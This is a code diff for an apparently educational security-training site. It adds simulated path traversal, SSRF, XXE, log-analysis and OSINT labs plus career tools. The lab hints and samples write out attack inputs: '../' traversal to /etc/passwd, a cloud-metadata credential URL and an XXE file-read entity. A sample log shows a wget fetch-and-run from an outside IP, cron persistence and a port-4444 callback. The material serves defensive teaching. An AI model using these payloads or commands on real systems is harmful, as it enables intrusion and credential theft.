@@ -2791,6 +3123,7 @@ function renderLabWebapp(){
     res.hidden = false;
     res.className = 'lab-hit' + (ok ? ' ok' : ' fail');
     res.innerHTML = why;
+    if(ok) markLabComplete('webapp');
   });
 }
 
@@ -2868,7 +3201,11 @@ function renderLabPcap(){
     `;
     setupReveal();
     document.getElementById('pcapFilter').addEventListener('input', e=>{ filter = e.target.value; paint(); });
-    app.querySelectorAll('.pcap-row[data-i]').forEach(btn=>btn.addEventListener('click', ()=>{ sel = parseInt(btn.dataset.i,10); paint(); }));
+    app.querySelectorAll('.pcap-row[data-i]').forEach(btn=>btn.addEventListener('click', ()=>{
+      sel = parseInt(btn.dataset.i,10);
+      paint();
+      if(pkts[sel] && /password=/.test(pkts[sel].payload||'')) markLabComplete('pcap');
+    }));
   }
   paint();
 }
@@ -2926,7 +3263,7 @@ function renderLabSqli(){
     const injected = /'/.test(uEl.value+pEl.value);
     if(rows.length && (rows[0].u==='admin')){
       res.innerHTML = `<div class="sqli-ok">✅ Logged in as <b>${escapeHtml(rows[0].u)}</b>${injected?' — via SQL injection! The tautology made the WHERE clause always true.':' with valid credentials.'}</div>`;
-      if(injected) fireConfetti({count:70});
+      if(injected){ fireConfetti({count:70}); markLabComplete('sqli'); }
     } else if(rows.length){
       res.innerHTML = `<div class="sqli-ok">✅ Logged in as <b>${escapeHtml(rows[0].u)}</b>.</div>`;
     } else {
@@ -2985,7 +3322,7 @@ function renderLabIdor(){
         ${isMine ? '✅' : '⚠️ IDOR!'} Invoice #${id} — <b>${escapeHtml(inv.owner)}</b> — ${inv.item} — ${inv.total}
         ${isMine ? '' : '<br><small>This isn\'t your invoice. A real API should have returned 403 Forbidden here.</small>'}
       </div>`;
-    if(!isMine) fireConfetti({count:70});
+    if(!isMine){ fireConfetti({count:70}); markLabComplete('idor'); }
   }
   document.getElementById('idorForm').addEventListener('submit', e=>{ e.preventDefault(); fetchInvoice(idEl.value.trim()); });
   document.querySelectorAll('.idor-quick').forEach(b=>b.addEventListener('click', ()=>{ idEl.value = b.dataset.id; fetchInvoice(b.dataset.id); }));
@@ -3042,6 +3379,7 @@ function renderLabJwt(){
     if(algNone && isAdmin){
       resEl.innerHTML = `<div class="sqli-bad">⚠️ Forged! The server accepted an unsigned token and granted <b>admin</b> access to "${escapeHtml(p.sub||'unknown')}".</div>`;
       fireConfetti({count:90});
+      markLabComplete('jwt');
     } else if(algNone){
       resEl.innerHTML = `<div class="sqli-ok">✅ Accepted (alg:none bypasses the signature check) but your role is still "${escapeHtml(p.role||'')}" — not admin yet.</div>`;
     } else {
@@ -3049,6 +3387,312 @@ function renderLabJwt(){
     }
   });
   setupReveal();
+}
+
+/* --- Lab: Path Traversal Playground --------------------------- */
+function renderLabTraversal(){
+  const FS = {
+    'report.pdf': '%PDF-1.4 (fake binary content — a normal file this "view" feature was built for)',
+    '../config.php': "<?php\n$db_password = 'sup3r-s3cr3t-db-pw';\n$api_key = 'sk_live_51Hxxx...';\n?>",
+    '../../etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:demo user:/home/user:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin'
+  };
+  app.innerHTML = `
+    <section class="sec">
+      <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+      <div class="sec-head" data-reveal style="--i:1">
+        <div class="sec-eyebrow">Interactive lab</div>
+        <h2>📂 Path Traversal Playground</h2>
+        <p class="sec-lead">This "view file" feature does <code>readFile("./uploads/" + filename)</code> with zero validation. Try to read something outside the <code>uploads/</code> folder. <span class="tool-privacy">🔒 Simulated locally — no real filesystem.</span></p>
+      </div>
+      <div class="idor-wrap" data-reveal style="--i:2">
+        <div class="idor-mine">
+          <div class="tool-note">Files meant to be viewable:</div>
+          <button class="btn-ghost sm idor-quick" data-f="report.pdf" type="button">report.pdf</button>
+        </div>
+        <form class="idor-form" id="travForm" autocomplete="off">
+          <label class="tool-field">GET /view?file=uploads/<input class="tool-input" id="travFile" value="report.pdf"></label>
+          <button class="btn-amber sm" type="button" id="travGo">Fetch file</button>
+        </form>
+        <div id="travResult"></div>
+        <details class="sqli-hint"><summary>Stuck? Show the trick</summary>
+          <div class="iv-answer">Try <code>../config.php</code> or <code>../../etc/passwd</code> — the <code>../</code> walks back up out of the <code>uploads/</code> folder the developer assumed you'd stay inside. Real fix: never build a filesystem path from raw user input — resolve the path, then verify it's still inside the allowed base directory (or use an indirect file ID instead of a raw filename).</div>
+        </details>
+      </div>
+    </section>
+  `;
+  const fEl = document.getElementById('travFile'), resEl = document.getElementById('travResult');
+  function fetchFile(name){
+    const escaped = name.includes('..');
+    const content = FS[name];
+    if(!content){
+      resEl.innerHTML = `<div class="sqli-bad">❌ File not found in uploads/${escapeHtml(name)}.</div>`;
+      return;
+    }
+    resEl.innerHTML = `
+      <div class="${escaped?'sqli-bad':'sqli-ok'}">
+        ${escaped ? '⚠️ Traversal!' : '✅'} uploads/${escapeHtml(name)}
+        <pre class="sqli-query" style="margin-top:.6rem">${escapeHtml(content)}</pre>
+      </div>`;
+    if(escaped){ fireConfetti({count:70}); markLabComplete('traversal'); }
+  }
+  document.getElementById('travGo').addEventListener('click', ()=>fetchFile(fEl.value.trim()));
+  document.querySelectorAll('.idor-quick').forEach(b=>b.addEventListener('click', ()=>{ fEl.value = b.dataset.f; fetchFile(b.dataset.f); }));
+  setupReveal();
+}
+
+/* --- Lab: SSRF Playground ---------------------------------------- */
+function renderLabSsrf(){
+  const INTERNAL = {
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role':
+      '{"AccessKeyId":"ASIAFAKE...","SecretAccessKey":"fakeSecretKey123...","Token":"fake-session-token"}',
+    'http://localhost:8080/admin': '<h1>Internal Admin Panel</h1><p>Reachable only from inside the network — but this "fetch" feature runs server-side, so YOU can reach it through it.</p>',
+    'http://internal-db:5432/status': '{"status":"ok","db":"prod-primary","connections":42}'
+  };
+  app.innerHTML = `
+    <section class="sec">
+      <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+      <div class="sec-head" data-reveal style="--i:1">
+        <div class="sec-eyebrow">Interactive lab</div>
+        <h2>🌐 SSRF Playground</h2>
+        <p class="sec-lead">This "preview a URL" feature fetches whatever address you give it, server-side, with no allowlist. Point it at something that sounds internal. <span class="tool-privacy">🔒 Simulated locally — no real network requests.</span></p>
+      </div>
+      <div class="idor-wrap" data-reveal style="--i:2">
+        <div class="idor-mine">
+          <div class="tool-note">Try:</div>
+          <button class="btn-ghost sm idor-quick" data-u="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role" type="button">cloud metadata endpoint</button>
+          <button class="btn-ghost sm idor-quick" data-u="http://localhost:8080/admin" type="button">localhost:8080/admin</button>
+        </div>
+        <form class="idor-form" id="ssrfForm" autocomplete="off">
+          <label class="tool-field">POST /preview  { url: <input class="tool-input" id="ssrfUrl" value="https://example.com" style="min-width:20rem"> }</label>
+          <button class="btn-amber sm" type="button" id="ssrfGo">Fetch</button>
+        </form>
+        <div id="ssrfResult"></div>
+        <details class="sqli-hint"><summary>Stuck? Show the trick</summary>
+          <div class="iv-answer">Cloud instances often expose a metadata service at <code>169.254.169.254</code> that hands out temporary cloud credentials to anything that can reach it — normally only the instance itself, but an SSRF-vulnerable server-side fetch reaches it <em>for you</em>. This is exactly how the 2019 Capital One breach happened. Real fix: allowlist destination hosts, block requests to link-local/private IP ranges, and never let user input control server-side request destinations directly.</div>
+        </details>
+      </div>
+    </section>
+  `;
+  const uEl = document.getElementById('ssrfUrl'), resEl = document.getElementById('ssrfResult');
+  function fetchUrl(url){
+    const hit = INTERNAL[url];
+    const looksInternal = /169\.254\.169\.254|localhost|127\.0\.0\.1|internal-|10\.\d+\.\d+\.\d+|192\.168\./.test(url);
+    if(hit){
+      resEl.innerHTML = `<div class="sqli-bad">⚠️ SSRF! The server fetched an internal resource for you:<pre class="sqli-query" style="margin-top:.6rem">${escapeHtml(hit)}</pre></div>`;
+      fireConfetti({count:90});
+      markLabComplete('ssrf');
+    } else if(looksInternal){
+      resEl.innerHTML = `<div class="sqli-bad">⚠️ That's an internal-looking address — try one of the quick buttons above for a hit that returns real "leaked" data.</div>`;
+    } else {
+      resEl.innerHTML = `<div class="sqli-ok">✅ Fetched ${escapeHtml(url)} — an ordinary public page, nothing interesting.</div>`;
+    }
+  }
+  document.getElementById('ssrfGo').addEventListener('click', ()=>fetchUrl(uEl.value.trim()));
+  document.querySelectorAll('.idor-quick').forEach(b=>b.addEventListener('click', ()=>{ uEl.value = b.dataset.u; fetchUrl(b.dataset.u); }));
+  setupReveal();
+}
+
+/* --- Lab: XXE Playground ------------------------------------------ */
+function renderLabXxe(){
+  const SAMPLE = `<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<order>
+  <item>Widget</item>
+  <notes>&xxe;</notes>
+</order>`;
+  app.innerHTML = `
+    <section class="sec">
+      <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+      <div class="sec-head" data-reveal style="--i:1">
+        <div class="sec-eyebrow">Interactive lab</div>
+        <h2>📄 XXE Playground</h2>
+        <p class="sec-lead">This "import order" feature parses uploaded XML with external entities enabled (the default in a lot of older XML parsers). Craft an XML document that reads a local file through it. <span class="tool-privacy">🔒 Simulated locally — no real XML parser or filesystem.</span></p>
+      </div>
+      <div class="idor-wrap" data-reveal style="--i:2">
+        <label class="tool-field">XML to upload<textarea class="tool-textarea" id="xxeInput" rows="8">${escapeHtml(SAMPLE)}</textarea></label>
+        <div class="tool-btnrow"><button class="btn-amber sm" id="xxeGo" type="button">Upload &amp; parse</button></div>
+        <div id="xxeResult"></div>
+        <details class="sqli-hint"><summary>Stuck? Show the trick</summary>
+          <div class="iv-answer">The sample already has it: a <code>&lt;!DOCTYPE&gt;</code> defining an external entity (<code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>) that gets substituted wherever <code>&amp;xxe;</code> appears in the document body. A vulnerable parser resolves that reference and hands you the file's contents back in the response. Real fix: disable external entity resolution (DTDs) in your XML parser's config — most modern libraries default this off precisely because of XXE, but plenty of legacy code still has it on.</div>
+        </details>
+      </div>
+    </section>
+  `;
+  const inEl = document.getElementById('xxeInput'), resEl = document.getElementById('xxeResult');
+  document.getElementById('xxeGo').addEventListener('click', ()=>{
+    const xml = inEl.value;
+    const entityMatch = xml.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"file:\/\/\/([^"]+)"/i);
+    const usesEntity = entityMatch && new RegExp('&' + entityMatch[1] + ';').test(xml);
+    if(entityMatch && usesEntity){
+      const path = entityMatch[2];
+      const fake = path.includes('passwd')
+        ? 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:demo user:/home/user:/bin/bash'
+        : `(fake) contents of /${path}`;
+      resEl.innerHTML = `<div class="sqli-bad">⚠️ XXE! The parser resolved the external entity and leaked a local file:<pre class="sqli-query" style="margin-top:.6rem">${escapeHtml(fake)}</pre></div>`;
+      fireConfetti({count:90});
+      markLabComplete('xxe');
+    } else {
+      resEl.innerHTML = `<div class="sqli-ok">✅ Parsed normally — no external entity referenced. Try the sample document as-is, or add a <code>&lt;!ENTITY&gt;</code> + reference of your own.</div>`;
+    }
+  });
+  setupReveal();
+}
+
+/* --- Lab: Log Analysis / Incident Response ------------------------ */
+function renderLabLogAnalysis(){
+  const LOG = [
+    '2026-03-11 09:14:02 sshd[3341]: Failed password for user from 203.0.113.55',
+    '2026-03-11 09:14:05 sshd[3341]: Failed password for user from 203.0.113.55',
+    '2026-03-11 09:14:09 sshd[3341]: Failed password for admin from 203.0.113.55',
+    '2026-03-11 09:14:14 sshd[3341]: Failed password for root from 203.0.113.55',
+    '2026-03-11 09:22:47 sshd[3341]: Failed password for user from 203.0.113.55',
+    '2026-03-11 09:31:03 sshd[3341]: Accepted password for user from 203.0.113.55',
+    '2026-03-11 09:31:04 sshd[3341]: pam_unix(sshd:session): session opened for user user',
+    '2026-03-11 09:33:12 user: sudo -u root /bin/bash',
+    '2026-03-11 09:33:15 user: whoami',
+    '2026-03-11 09:34:01 user: wget http://45.33.22.11/update.sh -O /tmp/.x',
+    '2026-03-11 09:34:03 user: chmod +x /tmp/.x && /tmp/.x',
+    '2026-03-11 09:34:10 cron: new entry added for user root: */5 * * * * /tmp/.x',
+    '2026-03-11 09:40:22 sshd[3402]: Accepted publickey for backup-svc from 10.0.0.5',
+    '2026-03-11 09:52:01 kernel: outbound connection 45.33.22.11:4444 established by /tmp/.x'
+  ];
+  const QUESTIONS = [
+    {q:'What technique got the attacker in?', options:['Phishing email','Brute-force / password guessing','Exploited a web vulnerability','Stolen SSH key'], correct:1,
+     why:'Repeated "Failed password" attempts from the same IP against multiple usernames (user, admin, root) followed by a success is a classic brute-force pattern.'},
+    {q:'What did the attacker do right after getting a shell?', options:['Immediately deleted logs','Escalated privileges with sudo','Changed the user password','Rebooted the server'], correct:1,
+     why:'"sudo -u root /bin/bash" right after login — the attacker moved straight to checking/using elevated privileges.'},
+    {q:'How did the attacker establish persistence?', options:['A new admin user account','A cron job running a downloaded script every 5 minutes','A scheduled Windows task','A new SSH authorized_key'], correct:1,
+     why:'The cron line adding "*/5 * * * * /tmp/.x" for root means the malicious script re-runs automatically even after a reboot — classic persistence.'}
+  ];
+  let qi = 0, score = 0, answered = false;
+  function paint(){
+    if(qi >= QUESTIONS.length){
+      app.innerHTML = `
+        <section class="sec">
+          <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+          <div class="sec-head" data-reveal>
+            <div class="sec-eyebrow">Interactive lab</div>
+            <h2>📜 Log Analysis complete</h2>
+            <p class="sec-lead">${score}/${QUESTIONS.length} correct. This is the exact "read the log, tell the story" skill a SOC analyst or IR responder uses every shift.</p>
+          </div>
+        </section>
+      `;
+      if(score === QUESTIONS.length){ fireConfetti({count:90}); markLabComplete('loganalysis'); }
+      setupReveal();
+      return;
+    }
+    const item = QUESTIONS[qi];
+    app.innerHTML = `
+      <section class="sec">
+        <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+        <div class="sec-head" data-reveal style="--i:1">
+          <div class="sec-eyebrow">Interactive lab</div>
+          <h2>📜 Log Analysis / IR Lab</h2>
+          <p class="sec-lead">A real-shaped auth.log from a compromised box. Read it, then answer ${QUESTIONS.length} questions to reconstruct what happened. Blue-team skills — no exploitation here.</p>
+        </div>
+        <pre class="sqli-query" data-reveal style="--i:2;max-height:20rem;overflow-y:auto">${LOG.join('\n')}</pre>
+        <div class="lab-panel" data-reveal style="--i:3">
+          <h3>Question ${qi+1} of ${QUESTIONS.length}</h3>
+          <p>${escapeHtml(item.q)}</p>
+          <div class="tool-btnrow" style="flex-direction:column;align-items:flex-start" id="logOptions">
+            ${item.options.map((o,i)=>`<button class="btn-ghost sm" data-i="${i}" type="button" style="width:100%;text-align:left">${escapeHtml(o)}</button>`).join('')}
+          </div>
+          <div id="logFeedback"></div>
+        </div>
+      </section>
+    `;
+    setupReveal();
+    document.querySelectorAll('#logOptions button').forEach(btn=>{
+      btn.addEventListener('click', ()=>{
+        if(answered) return;
+        answered = true;
+        const i = parseInt(btn.dataset.i,10);
+        const ok = i === item.correct;
+        if(ok) score++;
+        document.getElementById('logFeedback').innerHTML = `<div class="${ok?'sqli-ok':'sqli-bad'}" style="margin-top:1rem">${ok?'✅ Correct.':'❌ Not quite.'} ${escapeHtml(item.why)}</div>
+          <div class="tool-btnrow" style="margin-top:1rem"><button class="btn-amber sm" id="logNext" type="button">${qi+1<QUESTIONS.length?'Next question →':'See results →'}</button></div>`;
+        document.getElementById('logNext').addEventListener('click', ()=>{ qi++; answered=false; paint(); });
+      });
+    });
+  }
+  paint();
+}
+
+/* --- Lab: OSINT Sandbox -------------------------------------------- */
+function renderLabOsint(){
+  const PROFILE = {
+    company: 'Northgate Logistics Ltd.',
+    site: 'northgate-logistics.example',
+    employees: [
+      {name:'Dana Whitfield', role:'IT Administrator', note:'LinkedIn lists "Windows Server 2019, VMware, Cisco ASA" as skills. Posted a photo of their desk in 2025 — a sticky note is faintly visible on the monitor.'},
+      {name:'Marco Ilić', role:'Sales Director', note:'Public Twitter/X bio includes personal email: marco.ilic88@personalmail.example — reused pattern likely matches corporate format firstname.lastname@northgate-logistics.example.'},
+      {name:'Priya Raman', role:'HR Coordinator', note:'Job posting she authored lists internal tools by name: "experience with BambooHR and Okta a plus" — reveals their HR/IdP stack.'}
+    ],
+    jobPosting: 'We use AWS, a self-hosted GitLab instance at gitlab.internal.northgate-logistics.example, and are migrating our VPN from Cisco AnyConnect to Tailscale.',
+    metadata: 'A PDF on the public site ("2025-pricing.pdf") has document metadata: Author: "d.whitfield", Software: "Microsoft Word for Microsoft 365", Company: "Northgate Logistics Ltd."'
+  };
+  const FINDINGS = [
+    {id:'email-pattern', label:'Corporate email naming pattern (firstname.lastname@…)', hint:PROFILE.employees[1].note},
+    {id:'tech-stack', label:'Internal tech stack (AWS, GitLab, VPN vendor)', hint:PROFILE.jobPosting},
+    {id:'admin-identity', label:'Who administers IT systems, and what they run', hint:PROFILE.employees[0].note},
+    {id:'doc-metadata', label:'Usernames/software leaked via document metadata', hint:PROFILE.metadata},
+    {id:'hr-stack', label:'HR/identity tooling in use', hint:PROFILE.employees[2].note}
+  ];
+  const found = new Set();
+  let lastNote = '';
+  function paint(){
+    app.innerHTML = `
+      <section class="sec">
+        <a href="#/labs" class="back-link" data-reveal>← All labs</a>
+        <div class="sec-head" data-reveal style="--i:1">
+          <div class="sec-eyebrow">Interactive lab</div>
+          <h2>🔍 OSINT Sandbox</h2>
+          <p class="sec-lead">A fake company's public footprint — a "LinkedIn," a job posting, a PDF. Click each source to see what a real attacker (or a real pentester doing recon) could learn before ever touching the target. <span class="tool-privacy">🔒 Entirely fictional — nothing here is a real person or company.</span></p>
+        </div>
+        <div class="osint-grid" data-reveal style="--i:2">
+          <div class="lab-panel">
+            <h3>🏢 ${escapeHtml(PROFILE.company)}</h3>
+            <p class="sec-lead">Public site: ${escapeHtml(PROFILE.site)}</p>
+          </div>
+          ${PROFILE.employees.map((e,i)=>`
+            <div class="lab-panel">
+              <h3>👤 ${escapeHtml(e.name)}</h3>
+              <p class="sec-lead">${escapeHtml(e.role)}</p>
+              <button class="btn-ghost sm osint-reveal" data-note="${escapeHtml(e.note)}" type="button">Check their public profile</button>
+            </div>
+          `).join('')}
+          <div class="lab-panel">
+            <h3>📋 Job posting (public)</h3>
+            <button class="btn-ghost sm osint-reveal" data-note="${escapeHtml(PROFILE.jobPosting)}" type="button">Read the posting</button>
+          </div>
+          <div class="lab-panel">
+            <h3>📄 Public PDF metadata</h3>
+            <button class="btn-ghost sm osint-reveal" data-note="${escapeHtml(PROFILE.metadata)}" type="button">Inspect metadata</button>
+          </div>
+        </div>
+        <div id="osintNote">${lastNote ? `<div class="sqli-bad" style="margin-top:1rem">🕵️ ${escapeHtml(lastNote)}</div>` : ''}</div>
+        <div class="hub-section" data-reveal style="--i:3">
+          <div class="hub-section-head"><h3 style="font-family:'Space Grotesk';font-size:1.15rem">What you've uncovered (${found.size}/${FINDINGS.length})</h3></div>
+          ${FINDINGS.map(f=>`<div class="hub-list-item" style="cursor:default"><div><div class="hli-t">${found.has(f.id)?'✅':'🔒'} ${escapeHtml(f.label)}</div></div></div>`).join('')}
+        </div>
+      </section>
+    `;
+    setupReveal();
+    document.querySelectorAll('.osint-reveal').forEach(btn=>{
+      btn.addEventListener('click', ()=>{
+        lastNote = btn.dataset.note;
+        const match = FINDINGS.find(f=>f.hint === lastNote);
+        if(match && !found.has(match.id)){
+          found.add(match.id);
+          if(found.size === FINDINGS.length){ fireConfetti({count:90}); markLabComplete('osint'); }
+        }
+        paint();
+      });
+    });
+  }
+  paint();
 }
 
 /* --- Lab: phishing spotter game ------------------------------ */
@@ -3080,7 +3724,7 @@ function renderLabPhishing(){
         <p class="sec-lead" style="margin-top:1rem">${pct>=80?'Sharp eye — you\'d catch most real phishing.':pct>=50?'Not bad — keep drilling the red flags.':'Worth reviewing Path 10\'s phishing lesson, then try again.'}</p>
         <button class="btn-amber" id="phRestart" type="button">Play again</button>
       </div>`;
-      if(pct>=80) fireConfetti({count:90});
+      if(pct>=80){ fireConfetti({count:90}); markLabComplete('phishing'); }
       document.getElementById('phRestart').addEventListener('click', ()=>{ i=0; score=0; paintRound(); });
       return;
     }
@@ -3122,6 +3766,16 @@ function renderLabPhishing(){
    RSS feed (generate-feed.js reads this array).
    ============================================================ */
 const CHANGELOG = [
+  {date:'2026-07-23', title:'GRC path, 5 new labs, capstone chain & a dozen new tools', items:[
+    'New Path 23 — GRC & Compliance: governance, risk management, ISO 27001, NIST CSF, SOC 2, vendor risk, and how to break into a non-coding security career.',
+    'Five new labs: Path Traversal, SSRF, and XXE playgrounds, a Log Analysis / Incident Response lab, and an OSINT Sandbox.',
+    'Capstone attack chain: a narrative that chains four existing labs into one realistic breach, start to finish.',
+    'Weekly challenge chains: themed multi-question sets (Web/Network/Cloud Security Week), self-paced.',
+    'A focus timer (🍅) on lesson pages that logs sessions toward your streak.',
+    'Five new tools: a resume/LinkedIn keyword helper, a portfolio project generator, a secure code review toy, a MITRE ATT&CK mapper, and a STRIDE threat-model worksheet.',
+    'A 2-minute career-fit quiz recommending which track suits you.',
+    'High-contrast mode, a lab points/scoreboard, achievement rarity tiers, and a homepage "what to learn next" recommender.'
+  ]},
   {date:'2026-07-23', title:'Labs, career tools, skill tree & offline path packs', items:[
     'Two new labs: an IDOR playground and a JWT forgery lab (tamper the header/payload and slip past a vulnerable "verify" endpoint).',
     'New tool: Vulnerability Report Writer — a guided form that exports a clean Markdown or printable report.',
@@ -3374,7 +4028,12 @@ const TOOLS = [
   {id:'regex',    ico:'✳️', title:'Regex Tester',           desc:'Test a regular expression against sample text with live match highlighting and capture groups.', related:'Path 04 — Python'},
   {id:'hashid',   ico:'🕵️', title:'Hash Identifier',        desc:'Paste a hash and get likely algorithms, guessed from its length and character set.', related:'Path 06 — Cryptography'},
   {id:'headers',  ico:'🛡', title:'Security Header Analyzer', desc:'Paste HTTP response headers and get a graded report on the security headers present and missing.', related:'Path 11 — Web Security'},
-  {id:'vulnreport', ico:'📝', title:'Vulnerability Report Writer', desc:'A guided form that forces good structure — title, severity, steps to reproduce, impact, remediation — then exports clean Markdown or a printable PDF.', related:'Path 09 — Bug Bounty'}
+  {id:'vulnreport', ico:'📝', title:'Vulnerability Report Writer', desc:'A guided form that forces good structure — title, severity, steps to reproduce, impact, remediation — then exports clean Markdown or a printable PDF.', related:'Path 09 — Bug Bounty'},
+  {id:'resumehelper', ico:'📄', title:'Resume/LinkedIn Keyword Helper', desc:'Paste a job description, see which security keywords you already cover (based on completed paths) and which are gaps.', related:'Path 20 — Career Prep'},
+  {id:'portfoliogen', ico:'🧰', title:'Portfolio Project Generator', desc:'Guided starter briefs for real portfolio projects, with a write-up template you can export.', related:'Path 20 — Career Prep'},
+  {id:'codereview', ico:'🔎', title:'Secure Code Review Toy', desc:'Paste a code snippet and get flagged patterns — eval, string-built SQL, hardcoded secrets. Not a real SAST tool, but trains the eye.', related:'Path 22 — DevSecOps & AppSec'},
+  {id:'attckmap', ico:'🗺️', title:'MITRE ATT&CK Mapper', desc:'A searchable reference of real ATT&CK tactics and techniques, tied back to where this course covers each one.', related:'Path 16 — Advanced Topics'},
+  {id:'stride', ico:'🧩', title:'STRIDE Threat-Model Worksheet', desc:'A guided Spoofing/Tampering/Repudiation/Info-Disclosure/DoS/Elevation worksheet, exportable as Markdown.', related:'Path 22 — DevSecOps & AppSec'}
 ];
 
 function renderToolsIndex(){
@@ -3414,7 +4073,8 @@ function renderTool(id){
     </section>
   `;
   const body = document.getElementById('toolBody');
-  ({encoder:toolEncoder, hash:toolHash, jwt:toolJwt, cvss:toolCvss, subnet:toolSubnet, password:toolPassword, cipher:toolCipher, regex:toolRegex, hashid:toolHashId, headers:toolHeaders, vulnreport:toolVulnReport}[id])(body);
+  ({encoder:toolEncoder, hash:toolHash, jwt:toolJwt, cvss:toolCvss, subnet:toolSubnet, password:toolPassword, cipher:toolCipher, regex:toolRegex, hashid:toolHashId, headers:toolHeaders, vulnreport:toolVulnReport,
+    resumehelper:toolResumeHelper, portfoliogen:toolPortfolioGen, codereview:toolCodeReview, attckmap:toolAttckMap, stride:toolStride}[id])(body);
   setupReveal();
 }
 
@@ -3884,6 +4544,208 @@ function toolVulnReport(el){
   });
 }
 
+/* --- Resume / LinkedIn keyword helper --- */
+const RESUME_KEYWORDS = [
+  {kw:'penetration testing', pathId:'14-ethical-hacking'}, {kw:'vulnerability assessment', pathId:'10-fundamentals'},
+  {kw:'incident response', pathId:'16-advanced'}, {kw:'siem', pathId:'12-network-security'},
+  {kw:'network security', pathId:'12-network-security'}, {kw:'firewall', pathId:'02-networking'},
+  {kw:'cloud security', pathId:'08-cloud-basics'}, {kw:'aws', pathId:'08-cloud-basics'}, {kw:'azure', pathId:'08-cloud-basics'},
+  {kw:'owasp', pathId:'11-web-security'}, {kw:'web application security', pathId:'11-web-security'},
+  {kw:'sql injection', pathId:'11-web-security'}, {kw:'xss', pathId:'11-web-security'},
+  {kw:'threat modeling', pathId:'22-devsecops-appsec'}, {kw:'devsecops', pathId:'22-devsecops-appsec'},
+  {kw:'ci/cd security', pathId:'22-devsecops-appsec'}, {kw:'api security', pathId:'21-api-security'},
+  {kw:'malware analysis', pathId:'17-malware-re'}, {kw:'digital forensics', pathId:'16-advanced'},
+  {kw:'python', pathId:'04-python'}, {kw:'linux', pathId:'03-linux'}, {kw:'active directory', pathId:'16-advanced'},
+  {kw:'risk assessment', pathId:'23-grc-compliance'}, {kw:'iso 27001', pathId:'23-grc-compliance'},
+  {kw:'soc 2', pathId:'23-grc-compliance'}, {kw:'nist', pathId:'23-grc-compliance'}, {kw:'compliance', pathId:'23-grc-compliance'},
+  {kw:'cryptography', pathId:'06-crypto-fundamentals'}, {kw:'encryption', pathId:'06-crypto-fundamentals'},
+  {kw:'mobile security', pathId:'13-mobile-security'}, {kw:'bug bounty', pathId:'15-bug-bounty'},
+  {kw:'ctf', pathId:'19-ctf-challenges'}, {kw:'jwt', pathId:'21-api-security'}, {kw:'container', pathId:'16-advanced'},
+  {kw:'kubernetes', pathId:'16-advanced'}
+];
+function toolResumeHelper(el){
+  el.innerHTML = `
+    <label class="tool-field">Paste a job description<textarea id="rhInput" class="tool-textarea" rows="8" placeholder="Paste the full job posting text here…"></textarea></label>
+    <div class="tool-btnrow"><button class="btn-amber sm" id="rhGo" type="button">Analyze</button></div>
+    <div id="rhOut"></div>
+    <p class="tool-note">This matches known security keywords against the job text, then checks which ones you already have real progress in — nothing is sent anywhere, it all runs in your browser.</p>
+  `;
+  document.getElementById('rhGo').addEventListener('click', ()=>{
+    const text = document.getElementById('rhInput').value.toLowerCase();
+    const found = RESUME_KEYWORDS.filter(k=>text.includes(k.kw));
+    const out = document.getElementById('rhOut');
+    if(!found.length){ out.innerHTML = `<p class="tool-note">No known security keywords detected — paste a fuller job description.</p>`; return; }
+    const covered = found.filter(k=>pathProgress(k.pathId).pct > 0);
+    const gaps = found.filter(k=>pathProgress(k.pathId).pct === 0);
+    out.innerHTML = `
+      <div class="hub-section">
+        <div class="hub-section-head"><h3 style="font-family:'Space Grotesk';font-size:1.05rem">✅ You already have progress in (${covered.length})</h3></div>
+        ${covered.length ? covered.map(k=>`<div class="hub-list-item" style="cursor:default"><div class="hli-t">${escapeHtml(k.kw)}</div></div>`).join('') : `<div class="hub-empty">None yet.</div>`}
+      </div>
+      <div class="hub-section">
+        <div class="hub-section-head"><h3 style="font-family:'Space Grotesk';font-size:1.05rem">🎯 Gaps worth closing (${gaps.length})</h3></div>
+        ${gaps.length ? gaps.map(k=>{ const p=findPath(k.pathId); return `<a class="hub-list-item" href="#/lesson/${k.pathId}"><div class="hli-t">${escapeHtml(k.kw)}</div><div class="hli-d">Covered by ${p?p.title:k.pathId} →</div></a>`; }).join('') : `<div class="hub-empty">No gaps found — nice.</div>`}
+      </div>
+    `;
+  });
+}
+
+/* --- Portfolio project generator --- */
+const PORTFOLIO_BRIEFS = [
+  {t:'Break your own web app', d:'Build a tiny deliberately-vulnerable web app (or use one like DVWA/Juice Shop), find and document 5 real vulnerabilities in it.', steps:['Stand up the app locally','Pick 5 OWASP Top 10 categories to hunt for','Exploit each one and screenshot proof','Write a report per finding using the Vulnerability Report Writer tool','Publish the write-up on GitHub']},
+  {t:'Home lab SOC dashboard', d:'Set up a small home lab (2-3 VMs) with basic logging shipped to a free SIEM (e.g. Wazuh) and simulate + detect an attack.', steps:['Stand up 2-3 VMs (attacker, victim, SIEM)','Configure log forwarding','Run a simulated attack (brute force, malware download)','Detect it in the SIEM dashboard','Write up detection logic and what you\'d alert on']},
+  {t:'CTF write-up series', d:'Solve 5 CTF challenges (from this course\'s CTF Zone or a public platform) and write a clear, reproducible write-up for each.', steps:['Pick 5 challenges across different categories','Solve each one, keeping notes as you go','Write a step-by-step write-up per challenge','Publish as a GitHub repo or blog series']},
+  {t:'Threat model a real-shaped app', d:'Pick any app idea, run a full STRIDE threat model on its architecture using this course\'s STRIDE worksheet tool.', steps:['Sketch the architecture (client, API, DB, auth)','Run through STRIDE for each component','Prioritise the top 5 risks','Propose concrete mitigations','Export and publish the worksheet']},
+  {t:'Mini AppSec program design', d:'Design a lightweight AppSec program for a fictional 50-person startup — policies, tooling, and a 90-day rollout plan.', steps:['Define scope and current maturity (use the NIST CSF tiers)','Pick 3-5 initial controls to implement','Choose realistic free/cheap tooling','Write a 90-day rollout plan','Publish as a portfolio document']}
+];
+function toolPortfolioGen(el){
+  el.innerHTML = `
